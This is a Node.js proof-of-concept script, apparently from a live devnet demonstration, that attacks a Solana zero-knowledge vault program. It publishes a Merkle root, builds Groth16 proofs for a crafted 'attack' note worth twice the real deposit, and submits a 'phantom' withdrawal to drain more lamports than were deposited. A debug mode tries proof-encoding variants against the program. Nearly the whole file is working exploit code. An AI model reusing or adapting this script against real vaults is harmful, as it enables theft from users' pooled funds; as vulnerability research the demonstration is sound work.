import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";
import { execFileSync } from "node:child_process";
import {
  Connection, Keypair, PublicKey, Transaction, TransactionInstruction,
  ComputeBudgetProgram, sendAndConfirmTransaction,
} from "@solana/web3.js";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const ART = path.join(ROOT, "artifacts", "live-demo");
const PROGRAM_ID = new PublicKey("35GMe13ExGB1JGp1wZGrEvHfQnENKADroDQApeziKuwV");
const RPC = process.env.SOLANA_RPC_URL || "https://api.devnet.solana.com";
const WSOL = new PublicKey("So11111111111111111111111111111111111111112");
const TOKEN_PROGRAM = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const VAULT = new PublicKey("2eXRt3gsvbLbQZK5M78kvykqo9QpZTGrXiEc9vJoVnPn");
const RA = PublicKey.findProgramAddressSync([Buffer.from("root_authority")], PROGRAM_ID)[0];
const PAGE = PublicKey.findProgramAddressSync([Buffer.from("nullifier_page"), VAULT.toBuffer(), Buffer.from([0])], PROGRAM_ID)[0];
const payer = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(path.join(ROOT, "..", "keys", "devnet-deployer.json"), "utf8"))));
const conn = new Connection(RPC, "confirmed");
const log = (...a) => console.log("[atomic]", ...a);

// MiMC
const P = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;
const C = (() => { const s = fs.readFileSync(path.join(ROOT, "node_modules/circomlib/circuits/mimcsponge.circom"), "utf8"); return [...s.slice(s.indexOf("c_partial[218]")).matchAll(/(\d{10,})\s*,?/g)].map(m => BigInt(m[1])); })();
function feistel(a, b, k) { let xL = a, xR = b; for (let i = 0; i < 220; i++) { const c = (i === 0 || i === 219) ? 0n : C[i - 1]; const t = ((i === 0) ? k + a : k + xL + c) % P; const t5 = t * t % P * t % P * t % P * t % P; if (i < 219) { const aux = (i === 0) ? b : xR; const n = (aux + t5) % P; xR = xL; xL = n; } else return [xL, (xR + t5) % P]; } }
function sponge(ins) { let xL = 0n, xR = 0n; for (let i = 0; i < ins.length; i++) { if (i === 0) [xL, xR] = feistel(ins[0], 0n, 0n); else [xL, xR] = feistel((xL + ins[i]) % P, xR, 0n); } return xL; }
const hash2 = (a, b) => sponge([a, b]);

const st = JSON.parse(fs.readFileSync(path.join(ART, "state.json"), "utf8"));
const userWsol = new PublicKey(st.userWsol);
const pb = pk => { const b = pk.toBuffer(); const f = c => { const o = Buffer.alloc(32); c.copy(o, 16); return BigInt("0x" + o.toString("hex")); }; return [f(b.subarray(0, 16)), f(b.subarray(16))]; };
const [r0, r1] = pb(userWsol);
const [m0, m1] = pb(WSOL);

// on-chain leaves
const info = await conn.getAccountInfo(VAULT);
const dd = info.data;
const B = 8;
const ni = dd.readUInt32LE(B + 656);
let leafVals = [];
for (let i = 0; i < ni; i++) leafVals.push(BigInt("0x" + Buffer.from(dd.slice(B + 664 + i * 32, B + 664 + (i + 1) * 32)).toString("hex")));
while (leafVals.length < 128) leafVals.push(0n);
log("chain leaves:", ni);

// notes
const DEP = 50000000n, ATK = DEP * 2n;
const mkNote = (amt, sec, bl) => ({ amt, secret: BigInt(sec), blind: BigInt(bl), c: sponge([BigInt(amt), r0, r1, m0, m1, BigInt(bl), BigInt(sec)]) });
const attackNote = mkNote(ATK, st.attackSecret, st.attackBlinding);
const honestNote = mkNote(DEP, st.secret, st.blinding);
const attackC = be32n(attackNote.c);
function be32n(v) { return Buffer.from(BigInt(v).toString(16).padStart(64, "0"), "hex"); }
let aSlot = -1, hSlot = -1;
leafVals.forEach((v, i) => { if (v === attackNote.c) aSlot = i; if (v === honestNote.c) hSlot = i; });
log("slots: attack", aSlot, "honest", hSlot);

// root & publish
function rootOf(arr) { let l = arr.slice(); while (l.length > 1) { const n = []; for (let i = 0; i < l.length; i += 2) n.push(hash2(l[i], l[i + 1])); l = n; } return l[0]; }
function pathOf(arr, idx) { const pe = [], pi = []; let l = arr.slice(), cur = idx; while (l.length > 1) { pe.push(l[cur % 2 === 0 ? cur + 1 : cur - 1]); pi.push(cur % 2); const n = []; for (let i = 0; i < l.length; i += 2) n.push(hash2(l[i], l[i + 1])); l = n; cur = cur >> 1; } return { pe: pe.map(String), pi, root: l[0].toString() }; }
const ROOTV = rootOf(leafVals);
log("root:", ROOTV.toString(16));
const disc = n => crypto.createHash("sha256").update(`global:${n}`).digest().subarray(0, 8);
const u64le = n => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b; };
const be32nB = v => be32n(v);
await send([new TransactionInstruction({ programId: PROGRAM_ID, data: Buffer.concat([disc("update_root"), be32nB(ROOTV)]), keys: [
  { pubkey: VAULT, isSigner: false, isWritable: true },
  { pubkey: RA, isSigner: false, isWritable: false },
  { pubkey: payer.publicKey, isSigner: true, isWritable: false },
]})]).then(s2 => log("root tx:", s2)).catch(e => log("root:", String(e).includes("6002") ? "already published" : "ERR " + String(e).slice(0, 80)));

async function send(ixs) { return sendAndConfirmTransaction(conn, new Transaction().add(...ixs), [payer]); }

function prove(note) {
  const pth = pathOf(leafVals, leafVals.findIndex(v => v === note.c));
  const input = { amount: note.amt.toString(), receiver_token_part_0: r0.toString(), receiver_token_part_1: r1.toString(), mint_part_0: m0.toString(), mint_part_1: m1.toString(), blinding: note.blind.toString(), nullifier_secret: note.secret.toString(), pathElements: pth.pe, pathIndices: pth.pi };
  fs.writeFileSync(path.join(ART, "atomic_input.json"), JSON.stringify(input));
  execFileSync(path.join(ROOT, "node_modules/.bin/snarkjs"), ["groth16", "fullprove", path.join(ART, "atomic_input.json"), path.join(ROOT, "circuits/null_proof_js/null_proof.wasm"), path.join(ROOT, "circuits/null_proof_final.zkey"), path.join(ART, "atomic_proof.json"), path.join(ART, "atomic_public.json")], { stdio: "inherit" });
  const proof = JSON.parse(fs.readFileSync(path.join(ART, "atomic_proof.json"), "utf8"));
  const publics = JSON.parse(fs.readFileSync(path.join(ART, "atomic_public.json"), "utf8")).map(BigInt);
  // Canonical groth16-solana conversion (scripts/g16_bytes.mjs):
  //   A y-negated in the BASE field (Fq!), B c1-first limbs, everything BE.
  const { proofToGroth16Solana } = require_g16();
  const { proof_a, proof_b, proof_c, public_inputs } = proofToGroth16Solana(proof, publics);
  const nullifier = be32n(sponge([note.secret]));
  const rootB = be32n(pth.root);
  const args = Buffer.concat([u64le(note.amt), nullifier, rootB, Buffer.from(proof_a), Buffer.from(proof_b), Buffer.from(proof_c), ...public_inputs.map(Buffer.from)]);
  return { args, publics, proof };
}
import { createRequire } from "node:module";
function require_g16() { return createRequire(import.meta.url)("../scripts/g16_bytes.mjs"); }

function beX(v) { return v; }
function be32n2(v) { return be32n(v); }

if (process.argv[2] === "debug") {
  const note = attackNote;
  let { args, publics, proof } = prove(note);
  // optional B transforms via env
  const beD = d => Buffer.from(BigInt(d).toString(16).padStart(64, "0"), "hex");
  // A occupies args[72..136], B occupies args[136..264]
  let A2 = args.slice(72, 136);
  if (process.env.OX_A === "raw") A2 = Buffer.concat([beD(proof.pi_a[0]), beD(proof.pi_a[1])]);
  else if (process.env.OX_A === "xneg") A2 = Buffer.concat([beD((P - BigInt(proof.pi_a[0])) % P), beD(proof.pi_a[1])]);
  else A2 = Buffer.concat([beD(proof.pi_a[0]), beD((P - BigInt(proof.pi_a[1])) % P)]);
  let B2 = args.slice(136, 264);
  if (process.env.OX_B_MODE === "rowswap") B2 = Buffer.concat([beD(proof.pi_b[1][0]), beD(proof.pi_b[1][1]), beD(proof.pi_b[0][0]), beD(proof.pi_b[0][1])]);
  else if (process.env.OX_B_MODE === "halfswap") B2 = Buffer.concat([beD(proof.pi_b[0][1]), beD(proof.pi_b[0][0]), beD(proof.pi_b[1][1]), beD(proof.pi_b[1][0])]);
  args = Buffer.concat([args.slice(0, 72), A2, B2, args.slice(264)]);
  const data = Buffer.concat([
    disc("debug_pair_terms"),
    (() => { const pl = args.slice(72); const l = Buffer.alloc(4); l.writeUInt32LE(pl.length); return Buffer.concat([l, pl]); })(),
  ]);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 500_000 }),
    new TransactionInstruction({ programId: PROGRAM_ID, keys: [{ pubkey: payer.publicKey, isSigner: false, isWritable: false }], data }),
  );
  try {
    const sig = await conn.sendTransaction(tx, [payer]);
    await conn.confirmTransaction(sig, "confirmed");
    const ti = await conn.getTransaction(sig, { commitment: "confirmed" });
    console.log("LOGS:");
    for (const l of ti?.meta?.logMessages ?? []) if (/DBG|invoke|failed/.test(l)) console.log(" ", l);
    // also print our local expected first-bytes
    console.log("LOCAL A0..3:", args.slice(64, 68).toString("hex"), "(args layout: amount8|null32|root32|A@72)");
    console.log("LOCAL A@72..76:", args.slice(72, 76).toString("hex"));
  } catch (e) {
    console.log("ERR:", String(e).slice(0, 600));
  }
}

if (process.argv[2] === "withdraw") {
  const who = process.argv[3]; // "attack" | "payout" (aka honest)
  const note = who === "attack" ? attackNote : honestNote;
  log(`withdraw(${who}): claiming ${note.amt} lamports against a ${DEP} deposit`);
  const { args } = prove(note);
  // args layout: amount(8) nullifier(32) root(32) A(64) B(128) C(64) pubs(8*32)
  let o = 0; const take = n => { const s = args.subarray(o, o + n); o += n; return s; };
  const amount = take(8), nullifier = take(32), root = take(32), pa = take(64), pbb = take(128), pc = take(64);
  const pubs = []; for (let i = 0; i < 8; i++) pubs.push(take(32));
  if (o !== args.length) throw new Error("arg slicing mismatch " + o + "/" + args.length);
  const data = Buffer.concat([disc("prepare_phantom_withdraw_v2"), amount, nullifier, root, pa, pbb, pc, ...pubs]); // fixed-size array: no borsh length prefix
  function u32le(n) { const b = Buffer.alloc(4); b.writeUInt32LE(n); return b; }
  const VAULT_WSOL = new PublicKey(st.vaultWsol);
  const tx = new Transaction().add(
    ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
    new TransactionInstruction({
      programId: PROGRAM_ID,
      data,
      keys: [
        { pubkey: VAULT, isSigner: false, isWritable: true },
        { pubkey: WSOL, isSigner: false, isWritable: false },
        { pubkey: VAULT_WSOL, isSigner: false, isWritable: true },
        { pubkey: userWsol, isSigner: false, isWritable: true },
        { pubkey: payer.publicKey, isSigner: true, isWritable: false },
        { pubkey: TOKEN_PROGRAM, isSigner: false, isWritable: false },
        // remaining accounts: nullifier pages [0..=current]
        { pubkey: PAGE, isSigner: false, isWritable: true },
      ],
    }),
  );
  try {
    const bal0 = (await conn.getTokenAccountBalance(userWsol)).value.amount;
    const sig = await sendAndConfirmTransaction(conn, tx, [payer]);
    const bal1 = (await conn.getTokenAccountBalance(userWsol)).value.amount;
    log(`SUCCESS tx: ${sig}`);
    log(`payout: ${BigInt(bal1) - BigInt(bal0)} lamports (${bal0} -> ${bal1})`);
    console.log("RESULT: WITHDRAW_OK", sig);
  } catch (e) {
    const s = String(e);
    const errNo = /Error Number: (\d+)/.exec(s)?.[1] ?? (/custom program error: 0x(\w+)/i.exec(s)?.[1] ?? "?");
    log(`REJECTED: ${errNo}`);
    console.log("RESULT: REJECTED", errNo, s.slice(0, 300));
  }
}
